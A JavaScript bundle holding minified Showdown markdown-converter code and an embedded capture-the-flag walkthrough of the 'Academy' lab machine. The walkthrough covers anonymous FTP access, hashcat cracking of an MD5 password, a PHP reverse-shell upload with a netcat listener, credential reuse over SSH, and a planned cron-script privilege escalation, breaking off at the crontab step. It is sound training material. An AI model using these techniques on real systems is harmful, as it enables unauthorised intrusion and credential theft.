`}return c}return e=d.converter._dispatch("lists.before",e,u,d),e+="¨0",d.gListLevel?e=e.replace(/^(( {0,3}([*+-]|\d+[.])[ \t]+)[^\r]+?(¨0|\n{2,}(?=\S)(?![ \t]*(?:[*+-]|\d+[.])[ \t]+)))/gm,function(i,l,y){var b=y.search(/[*+-]/g)>-1?"ul":"ol";return f(l,b,!0)}):e=e.replace(/(\n\n|^\n?)(( {0,3}([*+-]|\d+[.])[ \t]+)[^\r]+?(¨0|\n{2,}(?=\S)(?![ \t]*(?:[*+-]|\d+[.])[ \t]+)))/gm,function(i,l,y,b){var g=b.search(/[*+-]/g)>-1?"ul":"ol";return f(y,g,!1)}),e=e.replace(/¨0/,""),e=d.converter._dispatch("lists.after",e,u,d),e}),r.subParser("metadata",function(e,u,d){if(!u.metadata)return e;e=d.converter._dispatch("metadata.before",e,u,d);function n(o){d.metadata.raw=o,o=o.replace(/&/g,"&amp;").replace(/"/g,"&quot;"),o=o.replace(/\n {4}/g," "),o.replace(/^([\S ]+): +([\s\S]+?)$/gm,function(f,i,l){return d.metadata.parsed[i]=l,""})}return e=e.replace(/^\s*«««+(\S*?)\n([\s\S]+?)\n»»»+\n/,function(o,f,i){return n(i),"¨M"}),e=e.replace(/^\s*---+(\S*?)\n([\s\S]+?)\n---+\n/,function(o,f,i){return f&&(d.metadata.format=f),n(i),"¨M"}),e=e.replace(/¨M/g,""),e=d.converter._dispatch("metadata.after",e,u,d),e}),r.subParser("outdent",function(e,u,d){return e=d.converter._dispatch("outdent.before",e,u,d),e=e.replace(/^(\t|[ ]{1,4})/gm,"¨0"),e=e.replace(/¨0/g,""),e=d.converter._dispatch("outdent.after",e,u,d),e}),r.subParser("paragraphs",function(e,u,d){e=d.converter._dispatch("paragraphs.before",e,u,d),e=e.replace(/^\n+/g,""),e=e.replace(/\n+$/g,"");for(var n=e.split(/\n{2,}/g),o=[],f=n.length,i=0;i<f;i++){var l=n[i];l.search(/¨(K|G)(\d+)\1/g)>=0?o.push(l):l.search(/\S/)>=0&&(l=r.subParser("spanGamut")(l,u,d),l=l.replace(/^([ \t]*)/g,"<p>"),l+="</p>",o.push(l))}for(f=o.length,i=0;i<f;i++){for(var y="",b=o[i],g=!1;/¨(K|G)(\d+)\1/.test(b);){var w=RegExp.$1,c=RegExp.$2;w==="K"?y=d.gHtmlBlocks[c]:g?y=r.subParser("encodeCode")(d.ghCodeBlocks[c].text,u,d):y=d.ghCodeBlocks[c].codeblock,y=y.replace(/\$/g,"$$$$"),b=b.replace(/(\n\n)?¨(K|G)\d+\2(\n\n)?/,y),/^<pre\b[^>]*>\s*<code\b[^>]*>/.test(b)&&(g=!0)}o[i]=b}return e=o.join(`
`),e=e.replace(/^\n+/g,""),e=e.replace(/\n+$/g,""),d.converter._dispatch("paragraphs.after",e,u,d)}),r.subParser("runExtension",function(e,u,d,n){if(e.filter)u=e.filter(u,n.converter,d);else if(e.regex){var o=e.regex;o instanceof RegExp||(o=new RegExp(o,"g")),u=u.replace(o,e.replace)}return u}),r.subParser("spanGamut",function(e,u,d){return e=d.converter._dispatch("spanGamut.before",e,u,d),e=r.subParser("codeSpans")(e,u,d),e=r.subParser("escapeSpecialCharsWithinTagAttributes")(e,u,d),e=r.subParser("encodeBackslashEscapes")(e,u,d),e=r.subParser("images")(e,u,d),e=r.subParser("anchors")(e,u,d),e=r.subParser("autoLinks")(e,u,d),e=r.subParser("simplifiedAutoLinks")(e,u,d),e=r.subParser("emoji")(e,u,d),e=r.subParser("underline")(e,u,d),e=r.subParser("italicsAndBold")(e,u,d),e=r.subParser("strikethrough")(e,u,d),e=r.subParser("ellipsis")(e,u,d),e=r.subParser("hashHTMLSpans")(e,u,d),e=r.subParser("encodeAmpsAndAngles")(e,u,d),u.simpleLineBreaks?/\n\n¨K/.test(e)||(e=e.replace(/\n+/g,`<br />
`)):e=e.replace(/  +\n/g,`<br />
`),e=d.converter._dispatch("spanGamut.after",e,u,d),e}),r.subParser("strikethrough",function(e,u,d){function n(o){return u.simplifiedAutoLink&&(o=r.subParser("simplifiedAutoLinks")(o,u,d)),"<del>"+o+"</del>"}return u.strikethrough&&(e=d.converter._dispatch("strikethrough.before",e,u,d),e=e.replace(/(?:~){2}([\s\S]+?)(?:~){2}/g,function(o,f){return n(f)}),e=d.converter._dispatch("strikethrough.after",e,u,d)),e}),r.subParser("stripLinkDefinitions",function(e,u,d){var n=/^ {0,3}\[([^\]]+)]:[ \t]*\n?[ \t]*<?([^>\s]+)>?(?: =([*\d]+[A-Za-z%]{0,4})x([*\d]+[A-Za-z%]{0,4}))?[ \t]*\n?[ \t]*(?:(\n*)["|'(](.+?)["|')][ \t]*)?(?:\n+|(?=¨0))/gm,o=/^ {0,3}\[([^\]]+)]:[ \t]*\n?[ \t]*<?(data:.+?\/.+?;base64,[A-Za-z0-9+/=\n]+?)>?(?: =([*\d]+[A-Za-z%]{0,4})x([*\d]+[A-Za-z%]{0,4}))?[ \t]*\n?[ \t]*(?:(\n*)["|'(](.+?)["|')][ \t]*)?(?:\n\n|(?=¨0)|(?=\n\[))/gm;e+="¨0";var f=function(i,l,y,b,g,w,c){return l=l.toLowerCase(),e.toLowerCase().split(l).length-1<2?i:(y.match(/^data:.+?\/.+?;base64,/)?d.gUrls[l]=y.replace(/\s/g,""):d.gUrls[l]=r.subParser("encodeAmpsAndAngles")(y,u,d),w?w+c:(c&&(d.gTitles[l]=c.replace(/"|'/g,"&quot;")),u.parseImgDimensions&&b&&g&&(d.gDimensions[l]={width:b,height:g}),""))};return e=e.replace(o,f),e=e.replace(n,f),e=e.replace(/¨0/,""),e}),r.subParser("tables",function(e,u,d){if(!u.tables)return e;var n=/^ {0,3}\|?.+\|.+\n {0,3}\|?[ \t]*:?[ \t]*(?:[-=]){2,}[ \t]*:?[ \t]*\|[ \t]*:?[ \t]*(?:[-=]){2,}[\s\S]+?(?:\n\n|¨0)/gm,o=/^ {0,3}\|.+\|[ \t]*\n {0,3}\|[ \t]*:?[ \t]*(?:[-=]){2,}[ \t]*:?[ \t]*\|[ \t]*\n( {0,3}\|.+\|[ \t]*\n)*(?:\n|¨0)/gm;function f(g){return/^:[ \t]*--*$/.test(g)?' style="text-align:left;"':/^--*[ \t]*:[ \t]*$/.test(g)?' style="text-align:right;"':/^:[ \t]*--*[ \t]*:$/.test(g)?' style="text-align:center;"':""}function i(g,w){var c="";return g=g.trim(),(u.tablesHeaderId||u.tableHeaderId)&&(c=' id="'+g.replace(/ /g,"_").toLowerCase()+'"'),g=r.subParser("spanGamut")(g,u,d),"<th"+c+w+">"+g+`</th>
`}function l(g,w){var c=r.subParser("spanGamut")(g,u,d);return"<td"+w+">"+c+`</td>
`}function y(g,w){for(var c=`<table>
<thead>
<tr>
`,m=g.length,v=0;v<m;++v)c+=g[v];for(c+=`</tr>
</thead>
<tbody>
`,v=0;v<w.length;++v){c+=`<tr>
`;for(var C=0;C<m;++C)c+=w[v][C];c+=`</tr>
`}return c+=`</tbody>
</table>
`,c}function b(g){var w,c=g.split(`
`);for(w=0;w<c.length;++w)/^ {0,3}\|/.test(c[w])&&(c[w]=c[w].replace(/^ {0,3}\|/,"")),/\|[ \t]*$/.test(c[w])&&(c[w]=c[w].replace(/\|[ \t]*$/,"")),c[w]=r.subParser("codeSpans")(c[w],u,d);var m=c[0].split("|").map(function(R){return R.trim()}),v=c[1].split("|").map(function(R){return R.trim()}),C=[],L=[],j=[],U=[];for(c.shift(),c.shift(),w=0;w<c.length;++w)c[w].trim()!==""&&C.push(c[w].split("|").map(function(R){return R.trim()}));if(m.length<v.length)return g;for(w=0;w<v.length;++w)j.push(f(v[w]));for(w=0;w<m.length;++w)r.helper.isUndefined(j[w])&&(j[w]=""),L.push(i(m[w],j[w]));for(w=0;w<C.length;++w){for(var O=[],q=0;q<L.length;++q)r.helper.isUndefined(C[w][q]),O.push(l(C[w][q],j[q]));U.push(O)}return y(L,U)}return e=d.converter._dispatch("tables.before",e,u,d),e=e.replace(/\\(\|)/g,r.helper.escapeCharactersCallback),e=e.replace(n,b),e=e.replace(o,b),e=d.converter._dispatch("tables.after",e,u,d),e}),r.subParser("underline",function(e,u,d){return u.underline&&(e=d.converter._dispatch("underline.before",e,u,d),u.literalMidWordUnderscores?(e=e.replace(/\b___(\S[\s\S]*?)___\b/g,function(n,o){return"<u>"+o+"</u>"}),e=e.replace(/\b__(\S[\s\S]*?)__\b/g,function(n,o){return"<u>"+o+"</u>"})):(e=e.replace(/___(\S[\s\S]*?)___/g,function(n,o){return/\S$/.test(o)?"<u>"+o+"</u>":n}),e=e.replace(/__(\S[\s\S]*?)__/g,function(n,o){return/\S$/.test(o)?"<u>"+o+"</u>":n})),e=e.replace(/(_)/g,r.helper.escapeCharactersCallback),e=d.converter._dispatch("underline.after",e,u,d)),e}),r.subParser("unescapeSpecialChars",function(e,u,d){return e=d.converter._dispatch("unescapeSpecialChars.before",e,u,d),e=e.replace(/¨E(\d+)E/g,function(n,o){var f=parseInt(o);return String.fromCharCode(f)}),e=d.converter._dispatch("unescapeSpecialChars.after",e,u,d),e}),r.subParser("makeMarkdown.blockquote",function(e,u){var d="";if(e.hasChildNodes())for(var n=e.childNodes,o=n.length,f=0;f<o;++f){var i=r.subParser("makeMarkdown.node")(n[f],u);i!==""&&(d+=i)}return d=d.trim(),d="> "+d.split(`
`).join(`
> `),d}),r.subParser("makeMarkdown.codeBlock",function(e,u){var d=e.getAttribute("language"),n=e.getAttribute("precodenum");return"```"+d+`
`+u.preList[n]+"\n```"}),r.subParser("makeMarkdown.codeSpan",function(e){return"`"+e.innerHTML+"`"}),r.subParser("makeMarkdown.emphasis",function(e,u){var d="";if(e.hasChildNodes()){d+="*";for(var n=e.childNodes,o=n.length,f=0;f<o;++f)d+=r.subParser("makeMarkdown.node")(n[f],u);d+="*"}return d}),r.subParser("makeMarkdown.header",function(e,u,d){var n=new Array(d+1).join("#"),o="";if(e.hasChildNodes()){o=n+" ";for(var f=e.childNodes,i=f.length,l=0;l<i;++l)o+=r.subParser("makeMarkdown.node")(f[l],u)}return o}),r.subParser("makeMarkdown.hr",function(){return"---"}),r.subParser("makeMarkdown.image",function(e){var u="";return e.hasAttribute("src")&&(u+="!["+e.getAttribute("alt")+"](",u+="<"+e.getAttribute("src")+">",e.hasAttribute("width")&&e.hasAttribute("height")&&(u+=" ="+e.getAttribute("width")+"x"+e.getAttribute("height")),e.hasAttribute("title")&&(u+=' "'+e.getAttribute("title")+'"'),u+=")"),u}),r.subParser("makeMarkdown.links",function(e,u){var d="";if(e.hasChildNodes()&&e.hasAttribute("href")){var n=e.childNodes,o=n.length;d="[";for(var f=0;f<o;++f)d+=r.subParser("makeMarkdown.node")(n[f],u);d+="](",d+="<"+e.getAttribute("href")+">",e.hasAttribute("title")&&(d+=' "'+e.getAttribute("title")+'"'),d+=")"}return d}),r.subParser("makeMarkdown.list",function(e,u,d){var n="";if(!e.hasChildNodes())return"";for(var o=e.childNodes,f=o.length,i=e.getAttribute("start")||1,l=0;l<f;++l)if(!(typeof o[l].tagName>"u"||o[l].tagName.toLowerCase()!=="li")){var y="";d==="ol"?y=i.toString()+". ":y="- ",n+=y+r.subParser("makeMarkdown.listItem")(o[l],u),++i}return n+=`
<!-- -->
`,n.trim()}),r.subParser("makeMarkdown.listItem",function(e,u){for(var d="",n=e.childNodes,o=n.length,f=0;f<o;++f)d+=r.subParser("makeMarkdown.node")(n[f],u);return/\n$/.test(d)?d=d.split(`
`).join(`
    `).replace(/^ {4}$/gm,"").replace(/\n\n+/g,`

`):d+=`
`,d}),r.subParser("makeMarkdown.node",function(e,u,d){d=d||!1;var n="";if(e.nodeType===3)return r.subParser("makeMarkdown.txt")(e,u);if(e.nodeType===8)return"<!--"+e.data+`-->

`;if(e.nodeType!==1)return"";var o=e.tagName.toLowerCase();switch(o){case"h1":d||(n=r.subParser("makeMarkdown.header")(e,u,1)+`

`);break;case"h2":d||(n=r.subParser("makeMarkdown.header")(e,u,2)+`

`);break;case"h3":d||(n=r.subParser("makeMarkdown.header")(e,u,3)+`

`);break;case"h4":d||(n=r.subParser("makeMarkdown.header")(e,u,4)+`

`);break;case"h5":d||(n=r.subParser("makeMarkdown.header")(e,u,5)+`

`);break;case"h6":d||(n=r.subParser("makeMarkdown.header")(e,u,6)+`

`);break;case"p":d||(n=r.subParser("makeMarkdown.paragraph")(e,u)+`

`);break;case"blockquote":d||(n=r.subParser("makeMarkdown.blockquote")(e,u)+`

`);break;case"hr":d||(n=r.subParser("makeMarkdown.hr")(e,u)+`

`);break;case"ol":d||(n=r.subParser("makeMarkdown.list")(e,u,"ol")+`

`);break;case"ul":d||(n=r.subParser("makeMarkdown.list")(e,u,"ul")+`

`);break;case"precode":d||(n=r.subParser("makeMarkdown.codeBlock")(e,u)+`

`);break;case"pre":d||(n=r.subParser("makeMarkdown.pre")(e,u)+`

`);break;case"table":d||(n=r.subParser("makeMarkdown.table")(e,u)+`

`);break;case"code":n=r.subParser("makeMarkdown.codeSpan")(e,u);break;case"em":case"i":n=r.subParser("makeMarkdown.emphasis")(e,u);break;case"strong":case"b":n=r.subParser("makeMarkdown.strong")(e,u);break;case"del":n=r.subParser("makeMarkdown.strikethrough")(e,u);break;case"a":n=r.subParser("makeMarkdown.links")(e,u);break;case"img":n=r.subParser("makeMarkdown.image")(e,u);break;default:n=e.outerHTML+`

`}return n}),r.subParser("makeMarkdown.paragraph",function(e,u){var d="";if(e.hasChildNodes())for(var n=e.childNodes,o=n.length,f=0;f<o;++f)d+=r.subParser("makeMarkdown.node")(n[f],u);return d=d.trim(),d}),r.subParser("makeMarkdown.pre",function(e,u){var d=e.getAttribute("prenum");return"<pre>"+u.preList[d]+"</pre>"}),r.subParser("makeMarkdown.strikethrough",function(e,u){var d="";if(e.hasChildNodes()){d+="~~";for(var n=e.childNodes,o=n.length,f=0;f<o;++f)d+=r.subParser("makeMarkdown.node")(n[f],u);d+="~~"}return d}),r.subParser("makeMarkdown.strong",function(e,u){var d="";if(e.hasChildNodes()){d+="**";for(var n=e.childNodes,o=n.length,f=0;f<o;++f)d+=r.subParser("makeMarkdown.node")(n[f],u);d+="**"}return d}),r.subParser("makeMarkdown.table",function(e,u){var d="",n=[[],[]],o=e.querySelectorAll("thead>tr>th"),f=e.querySelectorAll("tbody>tr"),i,l;for(i=0;i<o.length;++i){var y=r.subParser("makeMarkdown.tableCell")(o[i],u),b="---";if(o[i].hasAttribute("style")){var g=o[i].getAttribute("style").toLowerCase().replace(/\s/g,"");switch(g){case"text-align:left;":b=":---";break;case"text-align:right;":b="---:";break;case"text-align:center;":b=":---:";break}}n[0][i]=y.trim(),n[1][i]=b}for(i=0;i<f.length;++i){var w=n.push([])-1,c=f[i].getElementsByTagName("td");for(l=0;l<o.length;++l){var m=" ";typeof c[l]<"u"&&(m=r.subParser("makeMarkdown.tableCell")(c[l],u)),n[w].push(m)}}var v=3;for(i=0;i<n.length;++i)for(l=0;l<n[i].length;++l){var C=n[i][l].length;C>v&&(v=C)}for(i=0;i<n.length;++i){for(l=0;l<n[i].length;++l)i===1?n[i][l].slice(-1)===":"?n[i][l]=r.helper.padEnd(n[i][l].slice(-1),v-1,"-")+":":n[i][l]=r.helper.padEnd(n[i][l],v,"-"):n[i][l]=r.helper.padEnd(n[i][l],v);d+="| "+n[i].join(" | ")+` |
`}return d.trim()}),r.subParser("makeMarkdown.tableCell",function(e,u){var d="";if(!e.hasChildNodes())return"";for(var n=e.childNodes,o=n.length,f=0;f<o;++f)d+=r.subParser("makeMarkdown.node")(n[f],u,!0);return d.trim()}),r.subParser("makeMarkdown.txt",function(e){var u=e.nodeValue;return u=u.replace(/ +/g," "),u=u.replace(/¨NBSP;/g," "),u=r.helper.unescapeHTMLEntities(u),u=u.replace(/([*_~|`])/g,"\\$1"),u=u.replace(/^(\s*)>/g,"\\$1>"),u=u.replace(/^#/gm,"\\#"),u=u.replace(/^(\s*)([-=]{3,})(\s*)$/,"$1\\$2$3"),u=u.replace(/^( {0,3}\d+)\./gm,"$1\\."),u=u.replace(/^( {0,3})([+-])/gm,"$1\\$2"),u=u.replace(/]([\s]*)\(/g,"\\]$1\\("),u=u.replace(/^ {0,3}\[([\S \t]*?)]:/gm,"\\[$1]:"),u});var V=this;t.exports?t.exports=r:V.showdown=r}).call(fd)})(Qe);var ld=Qe.exports;const hd=`# Academy Walkthrough

Rooted Sep '23 by TrshPuppy, the puppy who roots through your trash...

## [Nmap](https://github.com/TrshPuppy/obsidian-notes/blob/main/CLI-tools/linux/nmap.md) Recon

\`\`\`bash
sudo nmap -A -p- -T4 10.0.2.15
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 12:46 EDT
Nmap scan report for 10.0.2.15
Host is up (0.00066s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.0.2.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
|   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
|_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:0A:72:50 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
\`\`\`

### Port 22

SSH on a CTF is normally treated differently than on an actual pentest. On a pentest, brute forcing [SSH](https://github.com/TrshPuppy/obsidian-notes/blob/main/networking/protocols/SSH.md) might be necessary to check for weak credentials. Additionally, brute forcing SSH on a pentest can be used as a test of the client's detection measures. I.e. 500 attempts to brute force an SSH login should be noticed by the client.

### Port 80

Has an Apache webserver running. If we visit the address \`http://<target IP>:80\` in the browser, we'll see a default page for Apache 2. This could mean that _[PHP](https://github.com/TrshPuppy/obsidian-notes/blob/main/coding/languages/PHP.md) is running the backend_. BTW, the default page _is considered a finding_, because it's disclosing architecture when it doesn't need to be.

### Port 21 ([FTP](https://github.com/TrshPuppy/obsidian-notes/blob/main/networking/protocols/FTP.md))

We can use the [ftp command](https://github.com/TrshPuppy/obsidian-notes/blob/main/CLI-tools/linux/ftp-command.md) to check the FTP service on the target. Let's attempt to login to the service using \`anonymous\` user.

\`\`\`bash
ftp 10.0.2.15
Connected to 10.0.2.15.
220 (vsFTPd 3.0.3)
Name (10.0.2.15:hakcypuppy): anonymous
331 Please specify the password.
Password:   # <------- password is 'anonymous'
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>        # <------- ftp shell
\`\`\`

We can also use \`ftp anonymous@<target IP>\` and a blank password.

If we type \`ls\` in the prompt, we can see a \`note.txt\`:

\`\`\`bash
ftp> ls
229 Entering Extended Passive Mode (|||22266|)
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
226 Directory send OK.
ftp>
\`\`\`

We can download this file to our own computer using the \`get\` command in the ftp prompt:

\`\`\`bash
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||10905|)
150 Opening BINARY mode data connection for note.txt (776 bytes).
100% |*****************************************************************************************|   776        2.17 MiB/s    00:00 ETA
226 Transfer complete.
776 bytes received in 00:00 (250.43 KiB/s)
ftp>
\`\`\`

We can also _upload a file here_. HOWEVER, there's no way to tell which directory this ftp server is listing for us. We can try to travel to it in the URL on the http page w/ \`http://<target IP>:80/note.txt\`, but it won't be there.

The idea is we could potentially _upload malware using the ftp server_ and get code execution by going to the URL.

## Note.txt

Since we've exfiltrated this note, let's look at it:

\`\`\`bash
cat note.txt
Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.

I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO \`students\` (\`StudentRegno\`, \`studentPhoto\`, \`password\`, \`studentName\`, \`pincode\`, \`session\`, \`department\`, \`semester\`, \`cgpa\`, \`creationdate\`, \`updationDate\`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.

Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
We can always adapt it to our needs.

-jdelta
\`\`\`

Here is what we've learned from this note:

### SQL:

There is an [SQL](https://github.com/TrshPuppy/obsidian-notes/blob/main/coding/languages/SQL.md) database storing information about users, including their passwords. Specifically, this table \`students\` stores student info.

### Run Ham

There is a student named 'Run Ham' whose password is \`cd73502828457d15655bbd7a63fb0bc8\` and ID number (for login) is 777777 for some endpoint called 'academy'. There's a chance this student hasn't had a chance to _change their default password yet._

### Grimmie

Grimmie, whoever they are, _uses the same password everywhere_. We should keep them in mind b/c if we find their password, then we can likely use it multiple times to access other interfaces.

## Hashed Password

The 'password' we got from note.txt is likely actually a hash of a password. There are some tools we can use to try to figure out what the original password is from the hash.

### [Hash-identifier](https://github.com/TrshPuppy/obsidian-notes/blob/main/cybersecurity/tools/cracking/hash-id.md)

... is a tool which takes a hash and outputs the possible/ likely algorithm which created it.

\`\`\`bash
hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\\ \\/\\ \\                   /\\ \\         /\\__  _\\  /\\  _ \`\\         #
   #    \\ \\ \\_\\ \\     __      ____ \\ \\ \\___     \\/_/\\ \\/  \\ \\ \\/\\ \\        #
   #     \\ \\  _  \\  /'__\`\\   / ,__\\ \\ \\  _ \`\\      \\ \\ \\   \\ \\ \\ \\ \\       #
   #      \\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, \`\\ \\ \\ \\ \\ \\      \\_\\ \\__ \\ \\ \\_\\ \\      #
   #       \\ \\_\\ \\_\\ \\___ \\_\\/\\____/  \\ \\_\\ \\_\\     /\\_____\\ \\ \\____/      #
   #        \\/_/\\/_/\\/__/\\/_/\\/___/    \\/_/\\/_/     \\/_____/  \\/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: cd73502828457d15655bbd7a63fb0bc8     # <------ hash goes here

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
\`\`\`

Now that we know it's an [MD5](https://github.com/TrshPuppy/obsidian-notes/blob/main/cybersecurity/hashing.md) hash, we can try to crack it.

### [hashcat](https://github.com/TrshPuppy/obsidian-notes/blob/main/cybersecurity/tools/cracking/hashcat.md)

Hashcat is a command line tool which _uses your CPU_ to crack hashes. For this hash we have to put it in a file to give to hashcat to crack:

\`\`\`bash
hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
...

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

cd73502828457d15655bbd7a63fb0bc8:student  # <-------- CRACKED PASSWORD

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target...
\`\`\`

## Directory Busting

Now that we have a username and password, we need to find where we can use them. From the note, we know they are meant for a 'student' who has a login for 'academy'.

Considering all of our open ports (SSH, FTP, HTTP), we can try to guess where these credentials might work. Starting w/ HTTP may be the easiest place to start since 'academy' could easily be an endpoint.

Instead of checking the academy endpoint in the browser, let's learn about [directory enumeration](https://github.com/TrshPuppy/obsidian-notes/blob/main/cybersecurity/TTPs/recon/directory-enumeration.md) ('dir busting').

### [dirb](https://github.com/TrshPuppy/obsidian-notes/blob/main/cybersecurity/tools/scanning-enumeration/dirb.md)

Dirb is a directory busting tool which is _recursive_, meaning it will go into every level of every directory found. This also makes it slow since it enters and enumerates every directory.

### [fuff](https://github.com/TrshPuppy/obsidian-notes/blob/main/cybersecurity/tools/scanning-enumeration/fuff.md)

FUFF is another dir busting tool which is _non-recursive_. It enumerates on the level you tell it to when you give the command a placeholder (\`FUZZ\`):

\`\`\`bash
ffuf -w /usr/share/wordlists/rockyou.txt:FUZZ -u http://10.0.2.15/FUZZ
\`\`\`

Once it's returned the results from that level, you can run it again to enumerate on the next level in. For example, if Fuff found \`http://10.0.2.15/academy\` w/ the first search, then to enumerate the academy path, you would just change your command to be: \`fuff ... -u http://10.0.2.15/academy/FUZZ\`.

## Logging in

![](./md-images/academy-1.png)

If we go to \`http://10.0.2.15/academy\` we get a login page where we can login with our new credentials. Once we're in, one of the interesting tabs we have access to is the \`My Profile\` tab. Clicking this, we find a form where we can upload a 'student photo'.

![](./md-images/academy-2.png)

Besides the photo upload, we can also pentest this for [SQL-injection](https://github.com/TrshPuppy/obsidian-notes/blob/main/cybersecurity/TTPs/exploitation/injection/SQL-injection.md), etc.. However, the simplest place to start is to _use the form like its intended_ and investigate from there.

## Student Photo Upload

### Plain Photo

Starting w/ a plain photo, let's see what happens:

![](./md-images/academy-3.png)

We can see a green success message, as well as our new photo. If we investigate the source, we might be able to figure out where the photo is being loaded from in the HTML:

![](./md-images/academy-4.png)

The endpoint for the photo is \`studentphoto/duck.jpeg\`. Let's try to go to that endpoint w/ the browser:

![](./md-images/academy-5.png)

The fact that we can see our duck in the browser means _the webserver is executing the file_, so we know if we upload some code _it will be executed_.

### Reverse Shell

Knowing that this is an Apache server, we can assume that PHP is running the backend. Additionally, we can see that php files are being referenced in the URLs.

PHP _executes on the server_, so whatever PHP is capable of doing, we can leverage to execute a [rev shell](https://github.com/TrshPuppy/obsidian-notes/blob/main/cybersecurity/TTPs/exploitation/rev-shell.md). An easy PHP shell for us to use is [this one](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) from pentest monkey. Copy and paste the code, change the hostname and port values, and make sure [netcat](https://github.com/TrshPuppy/obsidian-notes/blob/main/cybersecurity/tools/netcat.md) is listening on the port.

\`\`\`bash
nc -lvnp 44444
listening on [any] 44444 ...
connect to [10.0.2.4] from (UNKNOWN) [10.0.2.15] 51562
Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
 16:48:43 up 11:45,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1     -                Thu13   24:46m  0.04s  0.03s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
$ www-data
\`\`\`

## Privilege Escalation

You've entered the machine as \`www-data\` who does not have a lot of permissions. However, with some snooping, we find a lot of tasty files w/i our reach in the. Specifically in \`/var/www/html/includes\` we find \`config.php\`. Let's cat that:

\`\`\`bash
$ cat config.php
<?php
$mysql_hostname = "localhost";
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");
\`\`\`

_We've found Grimmie's password!_ This is specifically for mysql but we know that _Grimmie uses the same password for everything_. So let's try escalating our privilege by [SSH](https://github.com/TrshPuppy/obsidian-notes/blob/main/networking/protocols/SSH.md)ing in as Grimmie:

\`\`\`bash
ssh grimmie@10.0.2.15
grimmie@10.0.2.15''s password: My_V3ryS3cur3_P4ss
Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Oct  5 20:45:41 2023 from 10.0.2.4
grimmie@academy:~$  # <--- we in
\`\`\`

## Grimmie

Now that we're logged in as Grimmie, let's see what they have in their home dir.

\`\`\`bash
grimmie@academy:~$ ls
backup.sh
grimmie@academy:~$ cat backup.sh
#!/bin/bash

rm /tmp/backup.zip
zip -r /tmp/backup.zip /var/www/html/academy/includes
chmod 700 /tmp/backup.zip
\`\`\`

This file is removing a backup file, zipping a new one from the \`.../html/academy/includes\` dir, and setting permissions on it to root only.

Since this is a backup file _it's likely that it's being backed up on a scheduled interval_ by this script. And since the script is able to set root permissions on it, it's likely the scrip is _being executed as root_.

Theoretically, if we can swap this script out with our own, we can execute code as root. _But first_ we need to make sure it actually is being executed on a schedule.

### Automated scripts/ jobs

There are a few things we can check to make sure this script is being executed regularly. The first, and least invasive is simply to check the last time the \`/tmp/backup.zip\` file was edited:

\`\`\`bash
ls -al /tmp/backup.zip
-rwx------  1 root    root          2222 Oct  6 20:50 backup.zip
\`\`\`

Being that it's currently 20:51 when this command was run, we can see that \`backup.zip\` was recently accessed (w/i the last minute). We can either wait around to check again and see if we catch the next execution, or try a few other ways to check.

### [crontab](https://github.com/TrshPuppy/obsidian-notes/blob/main/CLI-tools/linux/crontab.md)

